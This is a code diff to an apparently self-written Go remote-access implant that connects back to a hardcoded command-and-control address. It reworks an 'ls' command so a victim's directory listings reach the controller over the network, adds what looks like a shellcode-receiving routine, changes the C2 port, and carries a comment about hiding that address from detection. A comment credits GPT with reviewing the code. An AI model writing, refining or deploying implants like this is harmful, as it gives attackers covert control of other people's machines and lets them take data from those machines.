@@ -2,6 +2,7 @@ package main
 
 import (
 	//"encoding/binary"
+	"encoding/binary"
 	"fmt"
 	"net"
 	"os"
@@ -113,16 +114,18 @@ func cd(conn *net.Conn, pImplantWD *string) {
 }
 
 // V1
-func ls(conn *net.Conn, implantWD *string) {
-	dirFS, _ := os.ReadDir(*implantWD)
-	dirListing := ""
-	for e := range dirFS {
-		dirInfo, _ := dirFS[e].Info()
-		KBSizeOfDir := dirInfo.Size() / 1000
-		dirListing = dirListing + "	" + fmt.Sprint(KBSizeOfDir) + "	 		" + fmt.Sprint(dirInfo.Mode()) + "	 	" + dirInfo.Name() + "\n"
-	}
-	(*conn).Write([]byte(dirListing))
-}
+// func ls(conn *net.Conn, implantWD *string) {
+// 	dirFS, _ := os.ReadDir(*implantWD)
+// 	dirListing := ""
+// 	for e := range dirFS {
+// 		dirInfo, _ := dirFS[e].Info()
+// 		KBSizeOfDir := dirInfo.Size() / 1000
+// 		dirListing = dirListing + "	" + fmt.Sprint(KBSizeOfDir) + "	 		" + fmt.Sprint(dirInfo.Mode()) + "	 	" + dirInfo.Name() + "\n"
+// 	}
+// 	arrayStr := []byte(dirListing)
+// 	fmt.Println(len(arrayStr))
+// 	(*conn).Write([]byte(dirListing))
+// }
 
 // V2
 // func ls(conn *net.Conn, implantWD *string) {
@@ -134,6 +137,54 @@ func ls(conn *net.Conn, implantWD *string) {
 // 		dirListing += "	" + fmt.Sprint(KBSizeOfDir) + "	 		" + fmt.Sprint(dirInfo.Mode()) + "	 	" + dirInfo.Name() + "\n"
 // 	}
 // }
+
+// v4 It works. Review this thanks to GPT
+func ls(conn *net.Conn, implantWD *string) {
+	dirFS, err := os.ReadDir(*implantWD)
+	if err != nil {
+		fmt.Println("Error reading directory:", err)
+		return
+	}
+
+	dirListing := ""
+	for _, entry := range dirFS {
+		dirInfo, err := entry.Info()
+		if err != nil {
+			fmt.Println("Error getting file info:", err)
+			continue
+		}
+		KBSizeOfDir := dirInfo.Size() / 1024 // Properly calculate size in KiB
+		dirListing += fmt.Sprintf("	%d	 		%s	 	%s\n", KBSizeOfDir, dirInfo.Mode(), dirInfo.Name())
+	}
+
+	// Convert the directory listing to bytes
+	data := []byte(dirListing)
+	totalLength := uint32(len(data))
+
+	// First, send the size of the data (length prefix)
+	lengthBytes := make([]byte, 4)
+	binary.BigEndian.PutUint32(lengthBytes, totalLength)
+
+	// Send length prefix
+	_, err = (*conn).Write(lengthBytes)
+	if err != nil {
+		fmt.Println("Error sending data length:", err)
+		return
+	}
+
+	// Send data in chunks (partial writes handling)
+	bytesSent := 0
+	for bytesSent < len(data) {
+		n, err := (*conn).Write(data[bytesSent:])
+		if err != nil {
+			fmt.Println("Error sending data:", err)
+			return
+		}
+		bytesSent += n
+	}
+
+	fmt.Printf("Sent %d bytes successfully\n", bytesSent)
+}
 
 func getSC(conn *net.Conn) ([]byte, int) {
 	buffer := make([]byte, 100)
@@ -167,7 +218,7 @@ func getSC(conn *net.Conn) ([]byte, int) {
 }
 
 func main() {
-	c2Address := "192.168.5.132:100" //Have it encrypted or anything and decode it during runtime
+	c2Address := "192.168.5.132:1234" //Have it encrypted or anything and decode it during runtime
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
